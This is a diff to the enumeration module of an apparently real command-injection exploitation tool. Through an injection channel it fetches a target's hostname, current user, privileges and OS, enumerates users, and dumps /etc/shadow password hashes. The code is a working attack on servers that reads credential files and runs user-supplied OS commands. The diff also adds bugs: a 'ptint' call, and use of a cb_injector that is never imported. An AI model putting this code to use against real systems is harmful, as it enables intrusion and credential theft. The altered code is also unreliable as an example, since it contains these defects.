@@ -15,14 +15,11 @@ For more see the file 'readme/COPYING' for copying permission.
 
 import re
 import sys
-
 from src.utils import logs
 from src.utils import menu
 from src.utils import settings
 from src.utils import session_handler
-
 from src.core.injections.controller import checks
-
 from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.semiblind.techniques.file_based import fb_injector
 
@@ -52,17 +49,14 @@ def powershell_version(separator, payload, TAG, timesec, prefix, suffix, whitesp
   try:
     if float(ps_version):
       settings.PS_ENABLED = True
-      # if settings.VERBOSITY_LEVEL != 0:
-      #   print(settings.SINGLE_WHITESPACE)
       # Output PowerShell's version number
-      info_msg = "The PowerShell's version number is " 
+      info_msg = "Powershell version: " 
       info_msg += ps_version + Style.RESET_ALL + Style.BRIGHT
-      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
-      sys.stdout.flush()
+      print(settings.print_bold_info_msg(info_msg))
       # Add infos to logs file. 
       output_file = open(filename, "a")
       if not menu.options.no_logging:
-        info_msg = "The PowerShell's version number is " + ps_version + ".\n"
+        info_msg = info_msg
         output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
       output_file.close()
   except ValueError:
@@ -88,15 +82,12 @@ def hostname(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_
   else:
     shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   if shell:
-    # if settings.VERBOSITY_LEVEL != 0:
-    #   print(settings.SINGLE_WHITESPACE)
-    info_msg = "The hostname is " +  str(shell)
-    sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
-    sys.stdout.flush()
+    info_msg = "Hostname: " +  str(shell)
+    print(settings.print_bold_info_msg(info_msg))
     # Add infos to logs file. 
     output_file = open(filename, "a")
     if not menu.options.no_logging:
-      info_msg = "The hostname is " + str(shell) + ".\n"
+      info_msg = "Hostname: " + str(shell) + "\n"
       output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
     output_file.close()
   else:
@@ -133,7 +124,7 @@ def system_information(separator, payload, TAG, timesec, prefix, suffix, whitesp
         distro_name = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
         distro_name = "".join(str(p) for p in distro_name)
         if len(distro_name) != 0:
-          target_os = target_os + " (" + distro_name + ")"
+          target_os = target_os + " " + distro_name
         session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
       else:
         target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
@@ -150,22 +141,17 @@ def system_information(separator, payload, TAG, timesec, prefix, suffix, whitesp
       session_handler.store_cmd(url, cmd, target_arch, vuln_parameter)
     else:
       target_arch = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
-    if target_arch:
-      # if settings.VERBOSITY_LEVEL != 0:
-      #   print(settings.SINGLE_WHITESPACE)
-      info_msg = "The underlying operating system is " +  str(target_os) + Style.RESET_ALL  
-      info_msg += Style.BRIGHT + " and the hardware platform is " +  str(target_arch)
-      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
-      sys.stdout.flush()
+    if target_os and target_arch:
+      info_msg = "Operating system: " + str(target_os) + " (" +  str(target_arch) + ")"
+      print(settings.print_bold_info_msg(info_msg))
       # Add infos to logs file.   
       output_file = open(filename, "a")
       if not menu.options.no_logging:
-        info_msg = "The underlying operating system is " + str(target_os)
-        info_msg += " and the hardware platform is " + str(target_arch) + ".\n"
+        info_msg = info_msg + "\n"
         output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
       output_file.close()
   else:
-    warn_msg = "Heuristics have failed to retrieve the system information."
+    warn_msg = "Heuristics have failed to fetch underlying operating system information."
     print(settings.print_warning_msg(warn_msg))
 
 """
@@ -185,63 +171,49 @@ def current_user(separator, payload, TAG, timesec, prefix, suffix, whitespace, h
   else:
     cu_account = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   if cu_account:
-    # Check if the user have super privileges.
-    if menu.options.is_root or menu.options.is_admin:
-      if settings.TARGET_OS == "win":
-        cmd = settings.IS_ADMIN
-      else:  
-        cmd = settings.IS_ROOT       
-      if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
-        # Command execution results.
-        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-        # Evaluate injection results.
-        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
-        shell = "".join(str(p) for p in shell)
-        session_handler.store_cmd(url, cmd, shell, vuln_parameter)
-      else:
-        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
-      info_msg = "The current user is " +  str(cu_account)  
-      sys.stdout.write(settings.print_bold_info_msg(info_msg))
-      # Add infos to logs file.    
-      output_file = open(filename, "a")
-      if not menu.options.no_logging:
-        info_msg = "The current user is " + str(cu_account)
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-      output_file.close()
-      if shell:
-        if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
-           (settings.TARGET_OS != "win" and shell != "0"):
-          sys.stdout.write(Style.BRIGHT + " and it is " +  "not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
-          sys.stdout.flush()
-          # Add infos to logs file.   
-          output_file = open(filename, "a")
-          if not menu.options.no_logging:
-            output_file.write(" and it is not privileged.\n")
-          output_file.close()
-        else:
-          sys.stdout.write(Style.BRIGHT + " and it is " +  Style.RESET_ALL + Style.BRIGHT + "privileged" + Style.RESET_ALL + ".\n")
-          sys.stdout.flush()
-          # Add infos to logs file.   
-          output_file = open(filename, "a")
-          if not menu.options.no_logging:
-            output_file.write(" and it is privileged.\n")
-          output_file.close()
-    else:
-      # if settings.VERBOSITY_LEVEL != 0:
-      #   print(settings.SINGLE_WHITESPACE)
-      info_msg = "The current user is " +  str(cu_account)
-      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
-      sys.stdout.flush()
-      # Add infos to logs file.   
-      output_file = open(filename, "a")
-      if not menu.options.no_logging:
-        info_msg = "The current user is " + str(cu_account) + "\n"
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-      output_file.close()
+    info_msg = "Current user: " +  str(cu_account)
+    print(settings.print_bold_info_msg(info_msg))
+    # Add infos to logs file.   
+    output_file = open(filename, "a")
+    if not menu.options.no_logging:
+      info_msg = "Current user: " + str(cu_account) + "\n"
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    output_file.close()
   else:
-    warn_msg = "Heuristics have failed to identify the current user."
+    warn_msg = "Heuristics have failed to fetch the current user."
     print(settings.print_warning_msg(warn_msg))
-    
+
+
+"""
+Check if the current user has excessive privileges.
+"""
+def check_current_user_privs(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+  if settings.TARGET_OS == "win":
+    cmd = settings.IS_ADMIN
+  else:  
+    cmd = settings.IS_ROOT       
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
+    # Command execution results.
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    # Evaluate injection results.
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
+    shell = "".join(str(p) for p in shell)
+    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+  else:
+    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+  _ = "True"
+  if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
+     (settings.TARGET_OS != "win" and shell != "0"):
+    _ = "False"
+
+  info_msg = "Current user has excessive privileges: " +  str(_)  
+  print(settings.print_bold_info_msg(info_msg))
+  # Add infos to logs file.    
+  output_file = open(filename, "a")
+  if not menu.options.no_logging:
+    output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+  output_file.close()
+
 """
 System users enumeration
 """
@@ -265,8 +237,6 @@ def system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, h
     sys_users = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   # Windows users enumeration.
   if settings.TARGET_OS == "win":
-    # if settings.VERBOSITY_LEVEL != 0:
-    #   print(settings.SINGLE_WHITESPACE)
     info_msg = "Executing the 'net users' command "
     info_msg += "in order to enumerate users entries. "  
     sys.stdout.write(settings.print_info_msg(info_msg))
@@ -281,9 +251,8 @@ def system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, h
         sys_users_list = sys_users_list.split()
         info_msg =  "Identified " + str(len(sys_users_list))
         info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
-        info_msg += " via 'net users' command.\n"
-        sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
-        sys.stdout.flush()
+        info_msg += " via 'net users' command."
+        print(settings.print_bold_info_msg(info_msg))
         # Add infos to logs file.   
         output_file = open(filename, "a")
         if not menu.options.no_logging:
@@ -296,10 +265,9 @@ def system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, h
             cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
             if alter_shell:
               cmd = cmd.replace("'","\\'")
-            else:
-              cmd = "\"" + cmd + "\""
-            response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-            check_privs = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
+            cmd = "cmd /c " + cmd 
+            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+            check_privs = cb_injector.injection_results(response, TAG, cmd)
             check_privs = "".join(str(p) for p in check_privs).strip()
             check_privs = re.findall(r"(.*)", check_privs)
             check_privs = "".join(str(p) for p in check_privs).strip()
@@ -313,37 +281,29 @@ def system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, h
           else :
             is_privileged = ""
             is_privileged_nh = ""
-          # if settings.VERBOSITY_LEVEL != 0:
-          #   print(settings.SINGLE_WHITESPACE)          
           print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + ".")
           # Add infos to logs file.   
           output_file = open(filename, "a")
           if not menu.options.no_logging:
-            output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + sys_users_list[user] + is_privileged + ".\n" )
+            output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + sys_users_list[user] + is_privileged + "\n" )
           output_file.close()
       else:
-        sys.stdout.write(settings.FAIL_STATUS)
-        sys.stdout.flush()
+        print(settings.SINGLE_WHITESPACE)
         warn_msg = "It seems that you don't have permissions to enumerate users entries."
-        print("\n" + settings.print_warning_msg(warn_msg))  # Unix-like users enumeration.    
+        print(settings.print_warning_msg(warn_msg))
     except TypeError:
-      sys.stdout.write(settings.FAIL_STATUS + "\n")
-      sys.stdout.flush()
       pass
-
     except IndexError:
-      sys.stdout.write(settings.FAIL_STATUS)
-      warn_msg = "It seems that you don't have permissions to enumerate users entries.\n"
-      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
-      sys.stdout.flush()
+      print(settings.SINGLE_WHITESPACE)
+      warn_msg = "It seems that you don't have permissions to enumerate users entries."
+      print(settings.print_warning_msg(warn_msg))
       pass
+      
+  # Unix-like users enumeration.
   else:
-    # if settings.VERBOSITY_LEVEL != 0:
-    #   print(settings.SINGLE_WHITESPACE)
-    info_msg = "Fetching the content of the file '" + settings.PASSWD_FILE 
+    info_msg = "Fetching content of the file '" + settings.PASSWD_FILE 
     info_msg += "' in order to enumerate users entries. "  
-    sys.stdout.write(settings.print_info_msg(info_msg))
-    sys.stdout.flush()
+    print(settings.print_info_msg(info_msg))
     try:
       if sys_users[0] :
         sys_users = "".join(str(p) for p in sys_users).strip()
@@ -353,11 +313,9 @@ def system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, h
           sys_users = sys_users.split(" ")
         # Check for appropriate '/etc/passwd' format.
         if len(sys_users) % 3 != 0 :
-          sys.stdout.write(settings.FAIL_STATUS)
-          sys.stdout.flush()
           warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is "
           warn_msg += "not in the appropriate format. Thus, it is expoted as a text file."
-          print("\n" + settings.print_warning_msg(warn_msg))
+          print(settings.print_warning_msg(warn_msg))
           sys_users = " ".join(str(p) for p in sys_users).strip()
           print(sys_users)
           output_file = open(filename, "a")
@@ -369,12 +327,10 @@ def system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, h
           for user in range(0, len(sys_users), 3):
              sys_users_list.append(sys_users[user : user + 3])
           if len(sys_users_list) != 0 :
-            sys.stdout.write(settings.SUCCESS_STATUS)
             info_msg = "Identified " + str(len(sys_users_list)) 
             info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
-            info_msg += " in '" +  settings.PASSWD_FILE + "'.\n"
-            sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
-            sys.stdout.flush()
+            info_msg += " in '" +  settings.PASSWD_FILE + "'."
+            print(settings.print_bold_info_msg(info_msg))
             # Add infos to logs file.   
             output_file = open(filename, "a")
             if not menu.options.no_logging:
@@ -414,11 +370,11 @@ def system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, h
                 else :
                   is_privileged = ""
                   is_privileged_nh = ""
-                print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
+                print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
                 # Add infos to logs file.   
                 output_file = open(filename, "a")
                 if not menu.options.no_logging:
-                  output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
+                  output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + fields[0] + "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
                 output_file.close()
               except ValueError:
                 if count == 1 :
@@ -432,30 +388,26 @@ def system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, h
                   output_file.write("      " + sys_users)
                 output_file.close()
       else:
-        sys.stdout.write(settings.FAIL_STATUS)
-        sys.stdout.flush()
+        print(settings.SINGLE_WHITESPACE)
         warn_msg = "It seems that you don't have permissions to read the '" 
         warn_msg += settings.PASSWD_FILE + "'."
-        print("\n" + settings.print_warning_msg(warn_msg))   
+        ptint(settings.print_warning_msg(warn_msg))  
     except TypeError:
-      sys.stdout.write(settings.FAIL_STATUS + "\n")
-      sys.stdout.flush()
+      pass
+    except IndexError:
+      print(settings.SINGLE_WHITESPACE)
+      warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
+      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
+      print(settings.print_warning_msg(warn_msg))
       pass
 
-    except IndexError:
-      sys.stdout.write(settings.FAIL_STATUS)
-      warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '"
-      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries.\n" 
-      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
-      sys.stdout.flush()
-      pass
-      
 """
 System passwords enumeration
 """
 def system_passwords(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):    
   if settings.TARGET_OS == "win":
-    # Not yet implemented!
+    check_option = "--passwords"
+    checks.unavailable_option(check_option)
     pass 
   else:
     cmd = settings.SYS_PASSES            
@@ -470,22 +422,16 @@ def system_passwords(separator, payload, TAG, timesec, prefix, suffix, whitespac
       sys_passes = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
     if sys_passes == "":
       sys_passes = " "
-      # if settings.VERBOSITY_LEVEL != 0:
-      #   print(settings.SINGLE_WHITESPACE)
-      info_msg = "Fetching the content of the file '" + settings.SHADOW_FILE 
+      info_msg = "Fetching content of the file '" + settings.SHADOW_FILE 
       info_msg += "' in order to enumerate users password hashes. "  
-      sys.stdout.write(settings.print_info_msg(info_msg))
-      sys.stdout.flush()
-      sys_passes = "".join(str(p) for p in sys_passes)
+      print(settings.print_info_msg(info_msg))
       sys_passes = sys_passes.replace(" ", "\n")
-      sys_passes = sys_passes.split( )
+      sys_passes = sys_passes.split()
       if len(sys_passes) != 0 :
-        sys.stdout.write(settings.SUCCESS_STATUS)
         info_msg = "Identified " + str(len(sys_passes))
         info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
-        info_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
-        sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
-        sys.stdout.flush()
+        info_msg += " in '" +  settings.SHADOW_FILE + "'."
+        print(settings.print_bold_info_msg(info_msg))
         # Add infos to logs file.   
         output_file = open(filename, "a")
         if not menu.options.no_logging:
@@ -498,7 +444,7 @@ def system_passwords(separator, payload, TAG, timesec, prefix, suffix, whitespac
             if ":" in line:
               fields = line.split(":")
               if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
-                print("  (" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
+                print("  (" +str(count)+ ") " + Style.BRIGHT + fields[0] + Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
                 # Add infos to logs file.   
                 output_file = open(filename, "a")
                 if not menu.options.no_logging:
@@ -509,25 +455,23 @@ def system_passwords(separator, payload, TAG, timesec, prefix, suffix, whitespac
             if count == 1 :
               warn_msg = "It seems that '" + settings.SHADOW_FILE + "' file is not "
               warn_msg += "in the appropriate format. Thus, it is expoted as a text file."
-              sys.stdout.write(settings.print_warning_msg(warn_msg)+ "\n")
+              print(settings.print_warning_msg(warn_msg))
             print(fields[0])
             output_file = open(filename, "a")
             if not menu.options.no_logging:
               output_file.write("      " + fields[0])
             output_file.close()
       else:
-        sys.stdout.write(settings.FAIL_STATUS)
-        sys.stdout.flush()
         warn_msg = "It seems that you don't have permissions to read the '" 
         warn_msg += settings.SHADOW_FILE + "' file."
-        print("\n" + settings.print_warning_msg(warn_msg))
+        print(settings.print_warning_msg(warn_msg))
 
 """
 Single os-shell execution
 """
 def single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   cmd =  menu.options.os_cmd
-  info_msg =  "Executing the user-supplied command '" + cmd + "'."
+  info_msg =  "Executing the user-supplied command: '" + cmd + "'."
   print(settings.print_info_msg(info_msg))
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
     # Command execution results.
@@ -538,43 +482,49 @@ def single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitesp
     session_handler.store_cmd(url, cmd, shell, vuln_parameter)
   else:
     shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
-  if shell:
-    if shell != "":
-      if settings.VERBOSITY_LEVEL <= 1:
-        print(settings.SINGLE_WHITESPACE)
-      print(settings.command_execution_output(shell))
-      print(settings.SINGLE_WHITESPACE)
+  if shell and shell != "":
+    _ = "'" + cmd + "' execution output"
+    print(settings.print_retrieved_data(_, shell))
   else:
-    err_msg = "The '" + cmd + "' command, does not return any output."
-    print(settings.print_critical_msg(err_msg))
-
+    err_msg = "The execution of '" + cmd + "' command does not return any output."
+    print(settings.print_error_msg(err_msg)) 
 
 """
 Check the defined options
 """
 def do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
-  
-  # if not settings.VERBOSITY_LEVEL != 0 and not settings.ENUMERATION_DONE:
-  #   print(settings.SINGLE_WHITESPACE)
-
   # Check if PowerShell is enabled.
   if not menu.options.ps_version and settings.TARGET_OS == "win":
     checks.ps_check()
 
   if menu.options.ps_version and settings.PS_ENABLED == None:
     if not checks.ps_incompatible_os():
+      info_msg = "Fetching powershell version."
+      print(settings.print_info_msg(info_msg))
       powershell_version(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
       settings.ENUMERATION_DONE = True
 
   if menu.options.hostname:
+    info_msg = "Fetching hostname."
+    print(settings.print_info_msg(info_msg))
     hostname(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.ENUMERATION_DONE = True
     
   if menu.options.current_user:
+    info_msg = "Fetching current user."
+    print(settings.print_info_msg(info_msg))
     current_user(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.ENUMERATION_DONE = True
 
+  if menu.options.is_root or menu.options.is_admin:
+    info_msg = "Testing if current user has excessive privileges."
+    print(settings.print_info_msg(info_msg))
+    check_current_user_privs(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    settings.ENUMERATION_DONE = True
+
   if menu.options.sys_info:
+    info_msg = "Fetching the underlying operating system information."
+    print(settings.print_info_msg(info_msg))
     system_information(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.ENUMERATION_DONE = True
 
